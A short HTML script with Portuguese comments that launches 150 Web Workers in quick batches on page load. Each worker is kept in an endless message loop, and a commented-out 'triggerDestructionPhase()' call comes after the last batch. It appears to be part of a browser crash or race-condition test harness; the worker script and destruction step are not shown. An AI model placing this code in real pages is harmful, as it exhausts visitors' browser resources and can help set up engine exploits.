<script>
const totalWorkers = 150;      // Alvo total de workers
const batchSize = 25;        // Quantidade de workers por lote
const batchDelay = 5;        // Intervalo em milissegundos entre os lotes
let activeWorkers = [];

function createWorkerBatch(startIndex) {
    const endIndex = Math.min(startIndex + batchSize, totalWorkers);
    
    for (let i = startIndex; i < endIndex; i++) {
        let w = new Worker('worker.js');
        w.onmessage = () => {
            w.postMessage(undefined);
        };
        w.postMessage(undefined);
        activeWorkers.push(w);
    }

    console.log(`Lote criado: ${endIndex} de ${totalWorkers} workers`);

    // Se ainda faltam workers, agenda o próximo lote
    if (endIndex < totalWorkers) {
        setTimeout(() => createWorkerBatch(endIndex), batchDelay);
    } else {
        console.log("Todos os lotes foram disparados com sucesso!");
        
        // Opcional: Se precisar disparar a condição de destruição logo em seguida
        // triggerDestructionPhase();
    }
}

onload = () => {
    createWorkerBatch(0);
};
    </script>
